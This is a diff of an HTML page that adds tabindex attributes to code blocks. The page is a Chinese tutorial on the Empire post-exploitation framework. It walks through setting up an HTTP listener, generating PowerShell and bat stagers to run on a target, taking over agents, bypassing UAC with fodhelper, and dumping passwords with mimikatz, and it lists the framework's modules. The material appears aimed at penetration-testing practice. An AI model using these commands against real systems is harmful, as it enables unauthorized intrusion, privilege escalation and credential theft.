@@ -85,7 +85,7 @@
 <p>Empire is a PowerShell and Python post-exploitation agent.</p>
 <p><a href="http://www.powershellempire.com/">http://www.powershellempire.com/</a></p>
 <h2 id="0x01-安装">0x01 安装</h2>
-<pre><code>git clone https://github.com/EmpireProject/Empire
+<pre tabindex="0"><code>git clone https://github.com/EmpireProject/Empire
 cd Empire/setup.sh
 ./install.sh
 </code></pre><h2 id="0x02-模块介绍">0x02 模块介绍</h2>
@@ -113,10 +113,10 @@ cd Empire/setup.sh
 <p><code>creds</code>是一个存储一些<code>agents</code>上获取到的凭证。</p>
 <h2 id="0x03-simply-use-empire">0x03 Simply use Empire</h2>
 <h3 id="如何获得agents">如何获得agents</h3>
-<pre><code>./empire # 启动empire
+<pre tabindex="0"><code>./empire # 启动empire
 </code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119428165.jpg" alt="2eca886e0349b46868d2f676b44a9703.png"></p>
 <p>有285个module可以使用，1个listener在使用，0个agents。</p>
-<pre><code>(Empire) &gt; listeners
+<pre tabindex="0"><code>(Empire) &gt; listeners
 
 [*] Active listeners:
 
@@ -128,7 +128,7 @@ cd Empire/setup.sh
 dbx           http_com      http_hop      meterpreter   redirector    
 http          http_foreign  http_mapi     onedrive     
 </code></pre><p>创建一个<code>listeners</code>：</p>
-<pre><code>(Empire: listeners) &gt; uselistener http
+<pre tabindex="0"><code>(Empire: listeners) &gt; uselistener http
 (Empire: listeners/http) &gt; info
 
     Name: HTTP[S]
@@ -170,7 +170,7 @@ HTTP[S] Options:
   StagerURI         False                                        URI for the stager. Must use /download/. Example: /download/stager.php
 
 </code></pre><p>一般情况只需要指定Host、Port、Name即可，其他的选项可以根据场景设置。</p>
-<pre><code>(Empire: listeners/http) &gt; set Name newListener
+<pre tabindex="0"><code>(Empire: listeners/http) &gt; set Name newListener
 (Empire: listeners/http) &gt; set Port 7788
 (Empire: listeners/http) &gt; execute
 [*] Starting listener 'newListener'
@@ -181,7 +181,7 @@ HTTP[S] Options:
  * Debug mode: off
 [+] Listener successfully started!
 </code></pre><p>查看<code>listeners</code>：</p>
-<pre><code>(Empire: listeners/http) &gt; listeners
+<pre tabindex="0"><code>(Empire: listeners/http) &gt; listeners
 
 [*] Active listeners:
 
@@ -191,11 +191,11 @@ HTTP[S] Options:
   newListener       http            http://192.168.117.181:7788            5/0.0                      
 
 </code></pre><p>生成控制命令：</p>
-<pre><code>launcher powershell newListener
+<pre tabindex="0"><code>launcher powershell newListener
 </code></pre><p>在目标主机上执行这条指令后，可以获得一个<code>agent</code>。</p>
 <p><strong>listeners中的Port必须和Host的端口相同</strong></p>
 <p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119441561.jpg" alt="5ce76e0d2cc5751a5185b435fa24dc00.png"></p>
-<pre><code>(Empire: listeners) &gt; agents
+<pre tabindex="0"><code>(Empire: listeners) &gt; agents
 
 [*] Active agents:
 
@@ -217,11 +217,11 @@ HTTP[S] Options:
 <li>powershell/privesc/bypassuac_wscript</li>
 </ul>
 <p>也可以直接这么使用：</p>
-<pre><code>(Empire: agents) &gt; interact MYZBFLEX
+<pre tabindex="0"><code>(Empire: agents) &gt; interact MYZBFLEX
 (Empire: MYZBFLEX) &gt; bypassuac
 </code></pre><p>但是默认的bypassuac是使用的<code>bypassuac_eventvwr</code>，这时候就需要调用其他的了
 。</p>
-<pre><code>(Empire: MYZBFLEX) &gt; usemodule privesc/bypassuac_fodhelper 
+<pre tabindex="0"><code>(Empire: MYZBFLEX) &gt; usemodule privesc/bypassuac_fodhelper 
 (Empire: powershell/privesc/bypassuac_fodhelper) &gt; info
 
               Name: Invoke-FodHelperBypass
@@ -275,7 +275,7 @@ Job started: 9HABCE
 
 </code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119464496.jpg" alt="20fb5ad72cd8b7ba728b8d0be7d08c87.png"></p>
 <p>此时<code>agents</code>列表如下：</p>
-<pre><code>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; agents
+<pre tabindex="0"><code>(Empire: powershell/privesc/bypassuac_fodhelper) &gt; agents
 
 [*] Active agents:
 
@@ -287,7 +287,7 @@ Job started: 9HABCE
 (Empire: agents) &gt; 
 
 </code></pre><p>计算机名前带有<code>*</code>的<code>agents</code>才可以使用<code>*</code>结尾的模块：</p>
-<pre><code>Display all 204 possibilities? (y or n)
+<pre tabindex="0"><code>Display all 204 possibilities? (y or n)
 code_execution/invoke_dllinjection
 code_execution/invoke_metasploitpayload
 code_execution/invoke_ntsd
@@ -494,7 +494,7 @@ trollsploit/wallpaper
 trollsploit/wlmdr
 </code></pre><h3 id="抓取密码">抓取密码</h3>
 <p>可在agents中直接调用mimikatz：</p>
-<pre><code>(Empire: VZWXYL4T) &gt; mimikatz
+<pre tabindex="0"><code>(Empire: VZWXYL4T) &gt; mimikatz
 [*] Tasked VZWXYL4T to run TASK_CMD_JOB
 [*] Agent VZWXYL4T tasked with task ID 1
 [*] Tasked agent VZWXYL4T to run module powershell/credentials/mimikatz/logonpasswords
@@ -504,7 +504,7 @@ Job started: EV7DPF
 
 </code></pre><p>默认是：powershell/credentials/mimikatz/logonpasswords</p>
 <p>也可以使用usemodule指定以下模块：</p>
-<pre><code>credentials/credential_injection*
+<pre tabindex="0"><code>credentials/credential_injection*
 credentials/enum_cred_store
 credentials/invoke_kerberoast
 credentials/mimikatz/cache*
@@ -528,10 +528,10 @@ credentials/sessiongopher
 credentials/tokens
 credentials/vault_credential*
 </code></pre><h3 id="提权">提权</h3>
-<pre><code>usemodule privesc/powerup/allchecks
+<pre tabindex="0"><code>usemodule privesc/powerup/allchecks
 execute
 </code></pre><h2 id="0x05-生成stager">0x05 生成stager</h2>
-<pre><code>(Empire) &gt; usestager 
+<pre tabindex="0"><code>(Empire) &gt; usestager 
 multi/bash                osx/macho                 windows/launcher_bat
 multi/launcher            osx/macro                 windows/launcher_lnk
 multi/macro               osx/pkg                   windows/launcher_sct
@@ -544,7 +544,7 @@ osx/dylib                 windows/dll               windows/teensy
 osx/jar                   windows/ducky             
 osx/launcher              windows/hta             
 </code></pre><p>生成一个bat的：</p>
-<pre><code>usestager windows/launcher_bat
+<pre tabindex="0"><code>usestager windows/launcher_bat
 set Listener hello
 execute
 </code></pre><p><img src="https://rvn0xsy.oss-cn-shanghai.aliyuncs.com/2018-12-18/1545119485031.jpg" alt="f5ddc9cdb32f7eebda8571e0dbb7dbc9.png"></p>
